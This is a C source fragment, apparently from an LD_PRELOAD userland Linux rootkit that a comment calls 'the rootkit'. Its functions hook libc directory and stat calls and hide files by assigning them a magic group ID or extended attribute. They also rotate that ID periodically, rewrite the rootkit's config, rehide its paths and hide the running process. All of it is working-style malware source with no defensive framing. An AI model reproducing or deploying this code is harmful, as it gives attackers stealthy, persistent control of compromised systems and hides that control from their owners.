id_t readid(void){
    if(!initmvbc()) return MAGIC_GID;
    return mvbc->magicid;
}

void hidedircontents(const char *path, const bdvcfg_t *bc){
    DIR *dp;

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    dp = call(COPENDIR, path);
    if(dp == NULL) return;

    const size_t pathlen = strlen(path);
    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;
        char tmp[pathlen+strlen(dir->d_name)+3];
        snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
        struct stat sbuf;
        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__LXSTAT, _STAT_VER, tmp, &sbuf) < 0)
            continue;
#ifdef USE_MAGIC_ATTR
        attrmodif(tmp, CSETXATTR);
#else
        chownpath(path, bc->magicid);
#endif
    }
    closedir(dp);
#ifdef USE_MAGIC_ATTR
    attrmodif(path, CSETXATTR);
#else
    chownpath(path, bc->magicid);
#endif
}

/* creates new magic ID for the rootkit. handles rehiding (& respawning) stuff that needs it.
 * curtime should be/is the return of time(NULL).
 * bc->idchangetime is updated with the new time(NULL) value, then the new bdvcfg_t is written.
 * finally, the new magic ID is returned.
 * 
 * if abc is NULL, then BDVL_CONFIG is read from upon calling. */
id_t changerkid(const time_t curtime){
    if(!reinitmvbc())
        return MAGIC_GID;

    id_t newid, oldid;
    char *magicattr = NULL;
#ifdef USE_MAGIC_ATTR
    magicattr = mvbc->magicattr;
#endif
    oldid = mvbc->magicid;

    srand(curtime);
    newid = randid();

    mvbc->magicid = newid;
#ifdef GID_CHANGE_MINTIME
    mvbc->idchangetime = curtime;  /* update the last change time. */
#endif
    updbdvcfg(mvbc);

    if(getgid() == oldid)
        hide_self();

    hidebdvpaths(mvbc, newid, oldid, magicattr);
    return newid;
}